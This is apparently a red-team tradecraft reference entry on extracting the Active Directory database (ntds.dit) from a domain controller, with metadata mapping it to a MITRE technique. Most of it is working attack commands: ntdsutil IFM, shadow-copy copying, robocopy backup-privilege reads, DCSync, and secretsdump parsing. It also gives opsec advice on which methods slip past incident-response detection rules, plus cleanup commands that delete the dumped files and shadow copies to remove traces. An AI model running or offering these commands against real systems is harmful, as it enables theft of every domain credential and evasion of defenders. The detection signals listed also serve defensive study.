---
name: NTDS.dit via Volume Shadow Copy (Enhanced)
category: credential-access
subcategories: [ntds-extraction, vss, ntdsutil, wbadmin]
tradecraft_tags: [ntds, ntds.dit, vss, shadow-copy, wbadmin, ntdsutil, ifm, credential-dump]
mitre_attack:
  - id: T1003.003
    name: OS Credential Dumping — NTDS
source:
  url: https://attack.mitre.org/techniques/T1003/003/
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-admin
network_required: false
detection_signal: |
  Multiple signals: VSS creation (System log, vss-related events), ntdsutil execution
  (Event 4688 if process auditing), ntds.dit file access (Sysmon Event 11 if file
  monitoring configured), wbadmin usage (backup events). Sysmon Event 9 (RawAccessRead)
  for VSS-based ntds.dit reads.
usage_examples:
  - description: ntdsutil IFM mode (clean, creates AD backup format — forensically common)
    args: "ntdsutil 'ac in ntds' ifm 'create full C:\\Windows\\Temp\\ifm' q q"
  - description: VSS creation + copy (manual, noisier)
    args: "vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit"
  - description: wbadmin alternative (creates backup to disk)
    args: "wbadmin start backup -backuptarget:\\\\SERVER\\Share -include:C: -quiet"
  - description: robocopy /B (SeBackupPrivilege path)
    args: "robocopy /B C:\\Windows\\NTDS C:\\Windows\\Temp ntds.dit"
opsec_notes: |
  ntdsutil IFM is the CLEANEST approach — it's the officially-supported AD backup method
  and is LESS suspicious than manual VSS creation. IR teams specifically look for direct
  ntds.dit copies but ntdsutil IFM output has a slightly different format that some
  detection rules miss. However, DCSync (Apollo native dcsync command) is ALWAYS
  preferred over NTDS extraction when network access to the DC exists:
  - No VSS creation events
  - No ntds.dit file on disk
  - Generates only network replication traffic
  - Targeted (only pull needed accounts)
gotchas: |
  Requires SYSTEM or DA on a DC. Always preferred alternative: Apollo native dcsync
  command. NTDS extraction only when DCSync is not possible. The extracted ntds.dit
  + SYSTEM hive must be parsed with secretsdump.py (infrastructure-side). ntdsutil IFM
  creates a full NTDS backup directory structure — larger output than a direct ntds.dit
  copy but cleaner forensically.
related_ttps: [shadow-copy-ntds, impacket-secretsdump, mimikatz, apollo]
alternatives: [apollo-dcsync, mimikatz-dcsync]
common_args: {}
last_updated: 2026-05-29
---

# NTDS.dit Extraction Methods (Enhanced)

Enhanced reference for extracting the Active Directory database (ntds.dit) when DCSync
is not viable. Multiple approaches ordered by noise level (quietest first).

## Method Comparison

| Method | Tool | Noise level | Notes |
|--------|------|-------------|-------|
| DCSync | Apollo dcsync / mimikatz | MEDIUM | No local artifacts; preferred |
| ntdsutil IFM | ntdsutil (built-in) | MEDIUM | Official backup tool; less flagged |
| robocopy /B | robocopy (built-in) | MEDIUM | SeBackupPrivilege path |
| VSS + copy | vssadmin + copy | HIGH | Manual VSS creation visible |
| wbadmin backup | wbadmin (built-in) | HIGH | Windows Server Backup events |
| Direct file copy | copy/xcopy | FAIL | ntds.dit is locked; won't work |

## DCSync (Primary Recommendation)

When network access to DC exists:
```
Apollo: dcsync /domain:north.sevenkingdoms.local /user:krbtgt
```
Pull only what's needed. No local artifacts. Much better than NTDS extraction.

## ntdsutil IFM (Best Local Method)

```cmd
ntdsutil "ac in ntds" ifm "create full C:\Windows\Temp\ifm" q q
```
Creates `C:\Windows\Temp\ifm\Active Directory\ntds.dit` and
`C:\Windows\Temp\ifm\registry\SYSTEM`

Parse on attacker infrastructure:
```bash
secretsdump.py -ntds "C:\Windows\Temp\ifm\Active Directory\ntds.dit" \
               -system "C:\Windows\Temp\ifm\registry\SYSTEM" LOCAL
```

## SeBackupPrivilege Path

If you have SeBackupPrivilege but not SYSTEM/DA:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
robocopy /B C:\Windows\NTDS C:\Windows\Temp ntds.dit
```
(Note: robocopy /B uses backup semantics to bypass ACL on locked files)

## Cleanup

```cmd
del /f C:\Windows\Temp\ntds.dit
del /f C:\Windows\Temp\SYSTEM
rmdir /s /q C:\Windows\Temp\ifm
vssadmin delete shadows /shadow={GUID} /quiet  # Remove VSS if created
```
